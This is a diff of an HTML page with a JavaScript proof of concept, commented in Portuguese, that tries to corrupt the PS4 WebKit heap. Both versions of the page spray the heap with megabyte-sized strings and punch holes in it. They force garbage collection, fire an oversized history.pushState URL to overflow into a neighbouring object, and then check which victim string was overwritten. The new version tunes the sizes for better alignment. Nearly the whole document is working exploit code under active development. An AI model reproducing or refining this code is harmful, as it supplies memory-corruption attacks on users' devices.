@@ -2,138 +2,145 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Heap Corruption Proof</title>
+    <title>PS4 WebKit Heap Corruption V2 (Size Match)</title>
     <style>
-        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; }
-        .log-entry { border-bottom: 1px solid #333; padding: 2px; }
-        .success { color: #ff0000; font-weight: bold; font-size: 1.2em; }
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .log-entry { border-bottom: 1px solid #222; margin-bottom: 2px; }
+        .success { color: #fff; background-color: #d00; padding: 5px; font-weight: bold; }
+        .info { color: #88f; }
     </style>
 </head>
 <body>
 
-<h2>WebKit Heap Grooming & Corruption PoC</h2>
-<p>Status: <span id="status">Waiting to start...</span></p>
-<button onclick="runExploit()">INICIAR TESTE DE CORRUPÇÃO</button>
-<div id="log"></div>
+<h2>WebKit Heap Feng Shui V2: Size Matching</h2>
+<p>Targeting 1MB Memory Bucket for 709KB Payload</p>
+
+<button style="font-size: 20px; padding: 10px;" onclick="startTest()">INICIAR TESTE REAL (V2)</button>
+<div id="log" style="margin-top: 20px;"></div>
 
 <script>
-    // CONFIGURAÇÃO TÉCNICA
-    // O tamanho do payload vulnerável é ~709KB.
-    // Precisamos de vítimas de tamanho similar para cair no mesmo 'Heap Bucket'.
-    // 0x100000 bytes = 1MB. WebKit alinha alocações grandes.
-    const VICTIM_SIZE = 0x80000; // 524KB (Tentativa de alinhar com o payload de 709KB)
-    const SPRAY_COUNT = 2000;    // Quantidade de objetos para encher a memória
+    // --- CONFIGURAÇÃO AVANÇADA ---
+    // Estratégia: Usar alocações de 1MB para cercar o payload de 709KB.
+    // O payload total (1050KB) deve estourar o limite de 1MB em aprox 26KB.
+    const MB = 1024 * 1024;
+    const VICTIM_SIZE = MB; // 1MB exato
+    const SPRAY_COUNT = 512; // Menos objetos, mas maiores (512MB total RAM)
     
     var victims = new Array(SPRAY_COUNT);
-    var exploit_str = ""; 
-
+    
     function log(msg, type="") {
         const el = document.getElementById('log');
         el.innerHTML = `<div class="log-entry ${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
     }
 
-    function createVictimString(len, index) {
-        // Cria uma string reconhecível: "BBBB...[index]"
-        // O index no final nos ajuda a saber QUAL vítima foi atingida
-        var s = new Uint8Array(len);
-        s.fill(0x42); // 'B'
-        // Marcador no final
-        var idxStr = index.toString();
-        for(let i=0; i<idxStr.length; i++) {
-            s[len - idxStr.length + i] = idxStr.charCodeAt(i);
-        }
-        return new TextDecoder().decode(s);
+    // Cria uma string pesada para ocupar o Heap
+    function createVictim(index) {
+        // Criamos um buffer preenchido com 'B' (0x42)
+        // Adicionamos um cabeçalho identificável para saber quem foi atingido
+        const header = `ID:${index}-`;
+        const padding = "B".repeat(VICTIM_SIZE - header.length);
+        return header + padding;
     }
 
-    // Passo 1: Heap Spray (Encher a memória)
     function heapSpray() {
-        log(`Iniciando Spray de ${SPRAY_COUNT} objetos de ${VICTIM_SIZE} bytes...`);
-        for (let i = 0; i < SPRAY_COUNT; i++) {
-            victims[i] = createVictimString(VICTIM_SIZE, i);
+        log(`[1/4] Iniciando Spray de ${SPRAY_COUNT} objetos de 1MB...`, "info");
+        try {
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                victims[i] = createVictim(i);
+            }
+            log("[1/4] Spray concluído. Memória alinhada (512MB alocados).");
+            setTimeout(punchHoles, 500);
+        } catch (e) {
+            log("Erro de memória (Out of Memory): " + e.message);
         }
-        log("Heap preenchido. Memória alinhada.");
     }
 
-    // Passo 2: Hole Punching (Criar buracos para a vulnerabilidade cair dentro)
     function punchHoles() {
-        log("Criando buracos (Holes) no Heap...");
-        // Liberamos objetos alternados no final do array (onde a alocação é mais estável)
-        // Liberamos 1 a cada 2 objetos para criar o padrão: [VÍTIMA] [BURACO] [VÍTIMA]
-        // Se o history.pushState cair no [BURACO], ele transborda para a [VÍTIMA] seguinte.
-        for (let i = SPRAY_COUNT - 500; i < SPRAY_COUNT; i += 2) {
+        log(`[2/4] Criando buracos (Holes) estratégicos...`, "info");
+        // Liberamos a cada 4 objetos para garantir estabilidade e criar "slots"
+        // Padrão: [V] [V] [__] [V] -> O payload cai no [__] e estoura no [V]
+        let holes = 0;
+        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i += 4) {
             victims[i] = null;
+            holes++;
         }
-        log("Buracos criados. Forçando Garbage Collection...");
         
-        // Força o WebKit a limpar a memória e consolidar os buracos
-        for(let k=0; k<100; k++) { new ArrayBuffer(0x10000); }
+        // Forçar Garbage Collector (Crucial no PS4)
+        // Alocações temporárias grandes forçam o GC a rodar e limpar os nulls
+        for(let k=0; k<200; k++) { new ArrayBuffer(0x20000); }
+        
+        log(`[2/4] ${holes} buracos preparados. Aguardando estabilização...`);
+        setTimeout(triggerExploit, 2000);
     }
 
-    // Passo 3: O Gatilho Vulnerável
-    function triggerVuln() {
-        log("Disparando history.pushState no buraco preparado...");
+    function triggerExploit() {
+        log(`[3/4] Disparando Payload Vulnerável (709KB + Overflow)...`, "info");
         
-        // Payload Original Ajustado
-        const BUFFER_LIMIT = 709522; 
-        const OOB_SIZE = 100000; // Reduzido para evitar crash imediato do sistema, queremos apenas tocar a vizinha
+        // O PAYLOAD REAL
+        const SAFE_SIZE = 709522; 
+        const OVERFLOW_SIZE = 350000; // ~340KB
         
-        const baseBuffer = "A".repeat(BUFFER_LIMIT);
-        // Usamos 0x01 (SOH) como byte de corrupção
-        const controlledOverflow = "\x01".repeat(OOB_SIZE); 
+        // Usamos 0x41 ('A') para a base e 0x24 ('$') para o overflow
+        // '$' é visualmente fácil de identificar se aparecer
+        const base = "A".repeat(SAFE_SIZE);
+        const overflow = "$".repeat(OVERFLOW_SIZE);
         
-        const finalPayload = "/" + baseBuffer + controlledOverflow;
+        const payload = "/" + base + overflow; // O '/' inicial é importante para URL parsing
 
         try {
-            history.pushState({}, "poc", finalPayload);
-            log("Payload enviado. Verificando danos...");
-            checkCorruption();
+            // Executa o ataque
+            history.pushState({}, "poc", payload);
+            
+            // Se o script continuar rodando, verificamos a memória
+            log("[3/4] Trigger executado. Verificando integridade das vítimas...");
+            setTimeout(checkSuccess, 100);
         } catch(e) {
-            log("Erro no trigger (pode ser bom se for crash controlado): " + e.message);
+            log("Erro crítico no trigger: " + e.message);
         }
     }
 
-    // Passo 4: Verificação (A prova real)
-    function checkCorruption() {
-        let corrupted = false;
-        // Varre as vítimas que SOBRARAM (as vizinhas dos buracos)
-        for (let i = SPRAY_COUNT - 500; i < SPRAY_COUNT; i++) {
+    function checkSuccess() {
+        log(`[4/4] Analisando memória por corrupção...`, "info");
+        let found = false;
+
+        // Varre as vítimas procurando o caractere do overflow ('$')
+        // Começamos de onde fizemos os buracos
+        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
             if (victims[i] !== null) {
                 let v = victims[i];
                 
-                // VERIFICAÇÃO 1: O comprimento mudou?
-                // Se sobrescrevemos o cabeçalho, o tamanho pode ficar gigante ou zero
+                // TESTE RÁPIDO: Verificar o primeiro caractere e o tamanho
+                // Se o overflow funcionou, o começo da string vizinha virou '$'
+                // Ou o tamanho mudou drasticamente
+                
+                // Nota: v.length pode retornar valor errado se corrompido, o que é BOM.
                 if (v.length !== VICTIM_SIZE) {
-                    log(`SUCESSO CRÍTICO! Vítima [${i}] comprimento alterado!`, "success");
-                    log(`Esperado: ${VICTIM_SIZE}, Encontrado: ${v.length}`, "success");
-                    corrupted = true;
-                    break;
+                    log(`⚡ SUCESSO! Vítima ID ${i} tem tamanho incorreto: ${v.length}`, "success");
+                    found = true;
                 }
 
-                // VERIFICAÇÃO 2: O conteúdo mudou?
-                // Verifica se os primeiros bytes viraram 0x01 (nosso payload) ou 'A'
-                //charCodeAt(0) deveria ser 0x42 ('B')
-                if (v.charCodeAt(0) !== 0x42) { 
-                    log(`SUCESSO! Conteúdo da Vítima [${i}] corrompido!`, "success");
-                    log(`Byte encontrado: ${v.charCodeAt(0)} (Esperado 66/0x42)`, "success");
-                    corrupted = true;
-                    break;
+                // Verifica se o conteúdo foi sobrescrito por '$' (código 36)
+                // O esperado era 'I' de "ID:..." (código 73)
+                if (v.charCodeAt(0) === 36) { 
+                    log(`⚡ SUCESSO CRÍTICO! Vítima ID ${i} foi sobrescrita com '$'!`, "success");
+                    found = true;
+                    // Se achou um, pare. Não queremos crashar lendo lixo.
+                    break; 
                 }
             }
         }
 
-        if (!corrupted) {
-            log("Falha: Nenhuma vítima foi atingida. Tente ajustar o VICTIM_SIZE.");
-            log("O payload caiu em uma região de memória isolada.");
+        if (!found) {
+            log("Falha: Nenhuma corrupção detectada. O alinhamento ainda não está perfeito.");
+            log("Dica: Tente mudar VICTIM_SIZE para 0xC0000 (768KB) ou 0x140000 (1.2MB).");
         }
     }
 
-    function runExploit() {
-        document.getElementById('status').innerText = "Running...";
-        setTimeout(heapSpray, 100);
-        setTimeout(punchHoles, 2000);
-        setTimeout(triggerVuln, 4000);
+    function startTest() {
+        document.getElementById('log').innerHTML = "";
+        heapSpray();
     }
-
 </script>
+
 </body>
 </html>
